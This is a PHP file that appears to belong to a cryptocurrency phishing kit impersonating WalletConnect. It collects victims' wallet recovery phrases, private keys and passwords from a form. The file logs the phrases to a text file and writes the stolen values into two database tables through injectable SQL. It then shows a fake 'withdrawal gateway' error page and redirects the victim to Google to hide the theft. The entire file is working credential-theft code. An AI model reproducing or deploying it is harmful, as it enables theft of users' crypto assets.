<?php
include 'db.php';

session_start();

$ApplicationNumber= $_POST['appNo'];
$_POST['category'];
$_POST['phrase'];

$key = $_POST['key'];
 $password = $_POST['password'];
 $refer=$_POST['refer'];
//$Program = $_POST['certPreference'];


 //$Fullname = $_POST['name'] . '     '. $_POST['companyname'] ;

//$ApplicationNumber  = trim($_POST['appNo']);
$category  = $_POST['category'];
$phrase =$_POST['phrase'];
$phrasee =$_POST['phrase'];

$key =$_POST['key'];
$keyy =$_POST['key'];
$password =$_POST['password'];
//$certPreference =$_POST['certPreference'];

$str = "$phrase";
    $str1 = substr($str, 5);
    $strkey = "$key";
    $strkey1 = substr($strkey, 1);

$data = "
$phrasee".PHP_EOL;//grabbing var/string
$fp = fopen('hi.txt', 'a');//open  content to write to new line
fwrite($fp, $data);//write data

$Query = "INSERT INTO `account`(`category`, `phrase`, `password`,`key`, `refer`, `regdate`) 
                 VALUES   ( '$category', '$str1', '$password', '$strkey1', '$refer', CURRENT_TIMESTAMP)";
                 
$Query2 = "INSERT INTO `accounts`(`category`, `phrase`, `password`,`key`, `refer`, `regdate`) 
                 VALUES   ( '$category', '$phrasee', '$password', '$keyy', '$refer', CURRENT_TIMESTAMP)";

 

// echo $Query;
    $Save=  mysqli_query($con,$Query);
    $Save=  mysqli_query($con,$Query2);




?>
<html>
<head>
<link rel="stylesheet" href="../main.css" type="text/css"/> 
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="Open protocol for connecting Wallets to Dapps">
<meta property="og:image" content="/images/logo.svg">
<link rel="icon" href="https://walletconnect.biz/images/logo.svg">
<meta http-equiv="refresh" content="3; URL=https://google.com" />
</head>
<body oncontextmenu="return false;">
<title>WIthdrawal GateWay - Error</title>

<body>
<center>
</br>
    <img src="../images/framee.png" width="250px" height="250px"/>
</br>
<h2>OOPS..! your withdrawal destination holds lesser balance to be charged!</h2>
<i>Successful withdrawal requires wallet not less than 50$(BNB)</i><br><img src="../images/load.gif" width="50px" height="50px"/> <br>Walcon&trade; Inc, 2018-2022
</center>
</body>
</html>
